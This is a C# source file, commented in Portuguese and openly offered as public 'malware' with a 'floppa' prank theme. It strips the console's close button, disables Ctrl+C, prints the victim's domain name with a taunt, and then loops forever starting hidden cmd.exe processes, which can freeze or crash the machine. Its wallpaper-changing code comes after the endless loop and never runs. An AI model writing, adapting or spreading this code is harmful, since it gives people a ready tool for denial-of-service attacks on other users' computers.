// Um malware publico feito 100% em c#, open source. Se for usar, Pelomenos dê os creditos pro [DIO-BRANDO].
// Agradecimento ao @CopyPaste que me ajudou com algumas coisas do proprio malware.
// Viva ao hacking no brasil.
// Codigo inteiramente Comentado pra vc entender se não manjar muito do assunto. Mas lembre-se, jamais copie isso.
// Vamos o codigo. 

using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Microsoft.Win32;
using System.Reflection;
using System.Threading;

namespace floppa_exe
{
    class masterchef
    {
        public enum Style : int
        {
            Tiled,
            Centered,
            Stretched
        }

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SystemParametersInfo(uint uiAction, uint uiParam, String pvParam, uint fWinIni);

        private const uint SPI_SETDESKWALLPAPER = 0x14;
        private const uint SPIF_UPDATEINIFILE = 0x1;
        private const uint SPIF_SENDWININICHANGE = 0x2;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        private const uint OpenExisting = 0x3;
        private const int MF_BYCOMMAND = 0x00000000;
        public const int SC_CLOSE = 0xF060;

        [DllImport("user32.dll")]
        public static extern int DeleteMenu(IntPtr hMenu, int nPosition, int wFlags);

        [DllImport("user32.dll")]
        private static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);

        [DllImport("kernel32.dll", ExactSpelling = true)]
        private static extern IntPtr GetConsoleWindow();
        static void Main()

            //espero do fundo da minha alma que voce não se ache um hacker por executar isso em algum pc
        {
            DeleteMenu(GetSystemMenu(GetConsoleWindow(), false), SC_CLOSE, MF_BYCOMMAND); // retira o botao de close do console.

            Console.ForegroundColor = ConsoleColor.Red;
            Console.SetWindowSize(60, 10);

            var floppa = @"
            |\---/|
            | ,_, |
            \_`_/-..----.
            ___/ `   ' ,""+ \  sk
        (__...'   __\    |`.___.';
            (_,...'(_,.`__)/'.....+
                ";
            Console.WriteLine(floppa);
            var user = Environment.UserDomainName; // Aqui ele pega o usuario do pc

            Console.WriteLine($"[*] Voce [{user}] caiu na pegadinha da floppa KKKKKKK");
            persistent();
	        Thread.Sleep(10000);

            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            process.StartInfo = startInfo;
            while (true)
            {
              process.Start();
            }
            string photo = @""; //Diretorio da foto pra alterar o wallpaper, de preferencia uma floppa, já que é a tematica.
            DisplayPicture(photo);
        }
        static void DisplayPicture(string file_name)
        {
            uint flags = 0;
            if (!SystemParametersInfo(SPI_SETDESKWALLPAPER,
                    0, file_name, flags))
            {
                Console.WriteLine("Error");
            }
        }

        static void persistent()
        {
            Console.TreatControlCAsInput = true; //Isso tira o scape do usuario pra sair pressionando control+C.
        }
        public static void Set(Uri uri, Style style)

        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            if (style == Style.Stretched)
            {
                key.SetValue(@"WallpaperStyle", 2.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());
            }

            if (style == Style.Centered)
            {
                key.SetValue(@"WallpaperStyle", 1.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());
            }

            if (style == Style.Tiled)
            {
                key.SetValue(@"WallpaperStyle", 1.ToString());
                key.SetValue(@"TileWallpaper", 1.ToString());
            }
        }
    }
} // Salve COPYPASTE.